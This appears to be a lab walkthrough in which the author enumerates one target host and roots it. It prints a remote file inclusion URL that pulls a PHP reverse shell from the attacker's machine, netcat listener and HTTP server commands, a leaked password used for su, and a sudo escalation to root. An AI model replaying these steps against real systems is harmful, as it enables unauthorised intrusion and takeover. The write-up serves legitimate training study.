Report

1. Nmap SYN Stealth scan to find open ports. We find that only port 80 is open.
`sudo nmap -p- 10.11.1.133`
![c2a9aafdbd5a45f1a7b6c1ab58d85cec.png](53398f24b6fd41ff94c7072270aae437.png)


2. Run nmap service detection with aggressive switch on port 80 only. Port 80 is running Microsoft IIS 5.6. The best guess for OS is Linux.
![4b3a97d67a5b23576e1b6fcfc6c4eb06.png](17dcc33756c84dfcb2b9b4778c3218aa.png)
![f5c722e37ff36de838e94dd9784e5127.png](3bcf2603d2cc4959a165a4946382ac91.png)


3. Run some Nmap scripts on port 80
`sudo nmap -p80 --script default,safe,auth,vuln --max-retries 4 10.11.1.133`
![3e48542ee7dd0686094caf7eead53584.png](cdabf4898f2b451f96d5284f6a1f96d0.png)
![600b46301cd5715cf91a05411ae94854.png](180d2d93f25a4de982343f7e3cb2cb0d.png)
![8d5265c68675d3c6dd9ef019585fb4e0.png](47f28c7c339f479ab87588b522412099.png)


4. Enumerate web server with dirb non-recursive scan shows directories consistent with Microsoft IIS 5.6 (eg. iissamples directory)
`dirb http://10.11.1.133 -r`
![6275107902e9989041c2b03c91f08b36.png](862e5b8152a04424a7252822f5e32821.png)


5. Recursive dirb
`dirb http://10.11.1.133`
![55df1e4f77f099aab1b004d24c74e8a6.png](1abeeab17c4541f9aa2e87be3870f5f7.png)
![b4234b607be670db0971516c44053c16.png](8c78974ff90843b3bc1d35c9f2f5c1fd.png)


6. Nikto scan to further enumerate the web server Ooutput.
`nikto -h 10.11.1.133`
![d28251a67cce89b25d5d0671331731e3.png](52dc61a321984c9588f3536d591a4ebf.png)


7. View landing page and its source code.
http://10.11.1.133/
![4d27d0a078b2a968d24a4d8182c19b9f.png](33ca619893d1487cb3c9623e75f2903e.png)
![2117b886737e110a93540729f8d76243.png](b0e37bd63d7c428c96c1aeeda134c06f.png)


8. View source code on every page that was found by dirb and Nikto. One page stands out:
http://10.11.1.133/test.asp
![59c983955b86b11a1c297af80935f1d4.png](8f2a28344efb4b479d973ffda3c5c9f2.png)
view-source:http://10.11.1.133/test.asp
![8d0f11c1af9c82326e9172929ce00952.png](234eaa79304e424b930b38bba6d7b094.png)

There is a reference to `hidd3n-script` but no other code. Didn't know what to do with that at this time.


9. netcat into port 80 document root
We see that at the end of the output it says **Bad Ph33r**.
`nc -nv 10.11.1.133 80`
![e083ce48fce44e657399bfcf424b779c.png](2da5691f2c0f4eca909ff03accd1afca.png)

But why does it have status 400 instead of 200? After some research, the solution is to change the user-agent to curl. I forgot the link I used but we would've known to try a different user agent by looking at NMAP's http-user-agent-test script results. Notice that **libcurl-agent/1.0** has status 200
![4dd176e4d5e208b936e9bf990e193c9d.png](db8053c508da454384387d6befead5e1.png)


10. Try to netcat the document root again, and we see this time it's status 200:
`printf "GET / HTTP/1.1\r\nHost: 10.11.1.133\r\nUser-Agent: libcurl-agent/1.0\r\nAccept: */*\r\n\r\n" | sudo nc 10.11.1.133 80`
![a59db22e4d142ea4d8fae08a21a58937.png](f2b1c569cecf431ab462de105c1ed53e.png)


11. Try to netcat the /test.asp directory
Using the libcurl-agent/1.0 browser useragent string, we get status 200
`printf "GET /test.asp HTTP/1.1\r\nHost: 10.11.1.133\r\nUser-Agent: libcurl-agent/1.0\r\nAccept: */*\r\n\r\n" | sudo nc 10.11.1.133 80`
![a71a4bcb831caee7fe0ae0e2131d2f8c.png](3453ddcdf8f842ce8e2994bdb3f14745.png)


12. Perhaps hidd3n-script is a directory... yes it is!
Using the libcurl-agent/1.0 browser useragent string, we get status 200. Aha! Here is the hidd3n-script:
`printf "GET /hidd3n-script HTTP/1.1\r\nHost: 10.11.1.133\r\nUser-Agent: libcurl-agent/1.0\r\nAccept: */*\r\n\r\n" | sudo nc 10.11.1.133 80`
![f295fd0524a567c54364949c7f7d576d.png](69bf956ee2094250801f6f68e8bc8479.png)


13. Deobfuscate hidd3n-script
I tried to beautify the code online, but those kept removing the var_0x5490 variable at the beginning of the script. I ended up manually replacing all the hex values myself using this website
[https://www.rapidtables.com/convert/number/hex-to-ascii.html](https://www.rapidtables.com/convert/number/hex-to-ascii.html)

How do I know it's JavaScript code? Google kept showing me search hits of the code (others have posted it on the web), all of which was javascript

Here is the deobfuscated code:
[hidd3n-script](5b3ec7c808234dbeb00707cd8b27f368.133hidd3)
![7e5ce1ba566d404aa9e4aba9da0cb653.png](c5f702161f7a47d1b8a3abe8836de2c8.png)


14. Understand what hidd3n-script is doing 
It specifies that the hidd3n-script is here:
[http://10.11.1.133/1f2e73705207bdd6467e109c1606ed29-21213/](http://10.11.1.133/1f2e73705207bdd6467e109c1606ed29-21213/)
![201b0f115b6269afe32071bd0e6e05f6.png](97daf9567ed840c1b671ed252271ff43.png)


15. How deep is the rabbit hole? Perhaps there are more nested directories or files... Yes there are!
From hidd3n-script, there are image files that we haven't seen yet. They are found in the directory.

Here is offsecphun1.gif:
[http://10.11.1.133/1f2e73705207bdd6467e109c1606ed29-21213/offsecphun1.gif](http://10.11.1.133/1f2e73705207bdd6467e109c1606ed29-21213/offsecphun1.gif)
![e049d92e76cdd7170de3ea0fb27ae662.png](bc4b76b227354ea4a76574c310261d87.png)

Here is offsecphun2.png:
[http://10.11.1.133/1f2e73705207bdd6467e109c1606ed29-21213/offsecphun2.png](http://10.11.1.133/1f2e73705207bdd6467e109c1606ed29-21213/offsecphun2.png)
![fe96ee28fb0e6e1e30257a4954cdb0e2.png](2bf654b76c4f4908952f19daa968924e.png)


16. Don't forget offsecphun5.bmp
Here is offsecphun5.bmp
[http://10.11.1.133/1f2e73705207bdd6467e109c1606ed29-21213/offsecphun5.bmp](http://10.11.1.133/1f2e73705207bdd6467e109c1606ed29-21213/offsecphun5.bmp)

When we input it into the browser it redirects us to an image in another directory:
[http://10.11.1.133/1f2e73705207bdd6467e109c1606ed29-21213/111111111/1.jpeg](http://10.11.1.133/1f2e73705207bdd6467e109c1606ed29-21213/111111111/1.jpeg)
![baf5ab1461fbe4a1a2f32378f6618ec8.png](cea7dbd479054f8082b4ee31d1b33a83.png) 

17. Check what else may be listed in the 111111111 dir.
We find a login page:
`http://10.11.1.133/1f2e73705207bdd6467e109c1606ed29-21213/111111111/`
![ec6828a95c3a2c6f5e90eb54d17e4ac0.png](a1b92b3eef8346c58091cab6e10ee6a6.png)

The source code:
![202a7570a9808c5da5f8a4a5480b0a52.png](cc0166f3545946a9ac082b00e8df4353.png)


18. Searchsploit slogin. No info found via on searchsploit:
`searchsploit slogin`
![5d4134a3e14751bea2ce8b7a22d62c6a.png](6ab79a58ff28475690af18896b91244d.png)


19. Google search of `slogin_POST_username`
We find a better search term: **SiTeFiLo**
![a625d0cc5faea33df70b86a204e8a23d.png](8db3c28dc4634e1a8c7ce996d4d2654e.png)


20. Searchsploit sitefilo. We find a single entry!
`searcshploit sitefilo`
![e841135600b82d507a8a4132c3d7475d.png](8fd51e6ffaf842138fd0af32f38e3546.png)


21. Download the sitefilo exploit. Exploit 7444.txt contains 2 exploits: a file disclosure and an RFI
`searchsploit -m 7444`
![06de2faf8bf4450d61a08eec0e3b0afd.png](5b8a9576f7e145db941d0841a6359549.png)
![88a084331762cc0dc0f759e7b9f1eebc.png](a6abc4a7bd92470f817adcc35e76d1be.png)
![fb82fd888a27260a7018f8f37a6c5116.png](e7c3908c2c1c40d8beb5976d44554c5f.png)


22. Check if file disclosure works on 7444.txt exploit.
![75574484cd2b55da9dd9c6ada990de2f.png](05b6c223f5b44e2087689ae2b4ad4438.png)

The slog_users.txt is there and reveals some credentials
`http://10.11.1.133/1f2e73705207bdd6467e109c1606ed29-21213/111111111/slog_users.txt`
![3b8c9d60c01287d3859081c99a3f1b5e.png](3ffd3379c8a74322ac93300240b338bd.png)


23. Attempt to crack the hashes - FAILED via cracstation and hashcat
Via crackstation
[https://crackstation.net/](https://crackstation.net/)
![7cd741e041594d59d2a59413f1107a80.png](cf1980c6525346c9b3e2f123f331233e.png)

Via Hashcat
`hashcat hashes.txt /usr/share/wordlists/rockyou.txt --force`
![4fb41e625d3e2306b1055d669adc8a34.png](02c1d56ab31a4f72abf834e4d30ec981.png)


24. Check if RFI works on 7444.txt exploit. 
![b242be26d0de6588be71c80b50a8ace4.png](bb008f2f62fe4eab933d6d6a0b46d11d.png)
**[!] EXPLOIT: /[path]/slogin_lib.inc.php?slogin_path=[remote_txt_shell]**

Navigate to slogin_lib.inc
[http://10.11.1.133/1f2e73705207bdd6467e109c1606ed29-21213/111111111/slogin_lib.inc.php](http://10.11.1.133/1f2e73705207bdd6467e109c1606ed29-21213/111111111/slogin_lib.inc.php)
![e7d83b3f0b51d5358ef0a5bc596780d3.png](4c4024bf825e44b6a8c2ecfb16d04c03.png)

### Confirm via netcat
`printf "GET /1f2e73705207bdd6467e109c1606ed29-21213/111111111/slogin_lib.inc.php HTTP/1.1\r\nHost: 10.11.1.133\r\nUser-Agent: libcurl-agent/1.0\r\nAccept: */*\r\n\r\n" | sudo nc 10.11.1.133 80`
![06e0dde97dbddc301d38daf8dac5a135.png](d8096fcebcba4bfc8c7a95bbf575af0b.png)


25. Pick a reverse shell, and modify it to use your attack machine's IP and listening port if necessary.
The shell that works is the one located at:
`/usr/share/webshells/php/php-reverse-shell.php`

26. Modify php-reverse_shell.php to use the Kali attack machine's IP and listening port of your choice.
In this example, attack machine IP=192.168.119.214, and listening port=5678
![05548188f4a4baede281c1251d35f533.png](def54dd291ca4ebda382df8557a32ec2.png)


27. Stop the apache2 service if necessary
`sudo systemctl stop apache2`
![05da08db7fe20e2f241338c08aeb83dd.png](abe0d28639ce41e5b3380b8e1f5a57b1.png)


28. Navigate or confirm to the directory where php-reverse-shell.php is, then start a python server on port 80
`sudo python -m SimpleHTTPServer 80`
![a61df0b5fa06b4b80ceb9c347eb12775.png](e08184ee08d24c04a7035619df9242a5.png)


29. Start a netcat listener on port 5678
`sudo nc -lvnp 5678`
![65aee39ebb2b4911b4d31982852cf0c6.png](a5a5722d69424d46aa04a0fc4537133d.png)


30. Browse to the shell
[http://10.11.1.133/1f2e73705207bdd6467e109c1606ed29-21213/111111111/slogin_lib.inc.php?slogin_path=http://192.168.119.214/php-reverse-shell.php?](http://10.11.1.133/1f2e73705207bdd6467e109c1606ed29-21213/111111111/slogin_lib.inc.php?slogin_path=http://192.168.119.214/php-reverse-shell.php?)

![d18e4fac5b75d50b737e615a5bbed2db.png](0b0ca45d6aa44d35935ad3114ef10901.png)


31. Observe the netcat listener now shows a shell
![8a4a998e9eac0622785118d4ede93907.png](8214deed35204722a05b5a0750e6f62b.png)


32. Run the script command
`script /dev/null`
![692bfe2e5d8b0f027ea0a2fc371c4fd2.png](63552cf66e014931a32640e05b0251dd.png)


33. Run the screen command
`screen`
![70b9029a7c1393bb07f4dd9232a1fa48.png](b87b36d5ab174c5797e1e2a2d3b863e3.png)


34. See which users have terminal access
`cat /etc/passwd | grep /bin/bash`
![de9e61d86274fff49c5c2904c1ea8251.png](2f0816afe28348a2a0dbbc64455fd3c9.png)


35. Change to user kibosh and use the credentials from slogin. **fbX8kAx3Y7ycgnm**
`su kibosh`
![fe037c44d1f669dfc3f3253403dd290f.png](ccec046537d242c687381394d8c59656.png)


36. Check if kibosh has sudo rights. Yes!
`sudo -l`
![808bbca09c063afecd2488075d180b42.png](8a9cc08316284d63b33d3be253889d23.png)


37. Switch to root user, run whoami, get IP address, and display proof file
`sudo su -`
`whoami`
`ifconfig -a`
`cat /root/proof.txt`
![a048892d1aaf9b77362046482c09509a.png](d518205a26634d229f54052c09df56a4.png)











